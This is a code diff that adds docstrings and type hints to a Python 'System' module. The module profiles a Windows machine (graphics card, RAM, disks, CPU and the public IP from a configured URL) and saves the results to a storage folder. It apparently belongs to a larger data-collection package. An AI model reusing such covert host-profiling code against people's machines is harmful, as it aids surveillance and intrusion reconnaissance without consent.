@@ -11,7 +11,9 @@ from stink.helpers import DisplayDevice, MemoryStatusEx, UlargeInteger
 
 
 class System:
-
+    """
+    Collects all system data.
+    """
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
         self.__storage_path = storage_path
@@ -20,16 +22,22 @@ class System:
 
         self.__config = SystemConfig()
 
-    def __create_folder(self):
-
+    def __create_folder(self) -> None:
+        """
+        Creates storage for the System module.
+        :return: None
+        """
         storage_path = rf"{self.__storage_path}\{self.__folder}"
 
         if not path.exists(storage_path):
             mkdir(storage_path)
 
     @staticmethod
-    def __get_video_card():
-
+    def __get_video_card() -> str:
+        """
+        Gets the video card name.
+        :return: str
+        """
         try:
 
             display_device = DisplayDevice()
@@ -39,7 +47,7 @@ class System:
             result = user32.EnumDisplayDevicesW(None, 0, byref(display_device), 0)
 
             if not result:
-                return None
+                return "Unknown"
 
             return display_device.DeviceString.strip()
 
@@ -47,8 +55,11 @@ class System:
             return "Unknown"
 
     @staticmethod
-    def __get_ram():
-
+    def __get_ram() -> str:
+        """
+        Gets information about RAM.
+        :return: str
+        """
         try:
 
             memory_status = MemoryStatusEx()
@@ -68,8 +79,11 @@ class System:
             return "Unknown"
 
     @staticmethod
-    def __get_disks_info():
-
+    def __get_disks_info() -> str:
+        """
+        Gets information about disks.
+        :return: str
+        """
         try:
 
             kernel32 = windll.kernel32
@@ -106,22 +120,31 @@ class System:
             return "Unknown"
 
     @staticmethod
-    def __get_processor_name():
-
+    def __get_processor_name() -> str:
+        """
+        Gets the processor name.
+        :return: str
+        """
         try:
             return QueryValueEx(OpenKey(HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"), "ProcessorNameString")[0]
         except:
             return "Unknown"
 
-    def __get_ip(self):
-
+    def __get_ip(self) -> str:
+        """
+        Gets the ip address.
+        :return: str
+        """
         try:
             return urlopen(Request(method="GET", url=self.__config.IPUrl)).read().decode("utf-8")
         except:
             return "Unknown"
 
-    def __get_system_info(self):
-
+    def __get_system_info(self) -> None:
+        """
+        Collects all system data.
+        :return: None
+        """
         user32 = windll.user32
         data = self.__config.SystemData
 
@@ -152,8 +175,11 @@ class System:
 
         system.close()
 
-    def run(self):
-
+    def run(self) -> None:
+        """
+        Launches the system data collection module.
+        :return: None
+        """
         try:
 
             self.__create_folder()
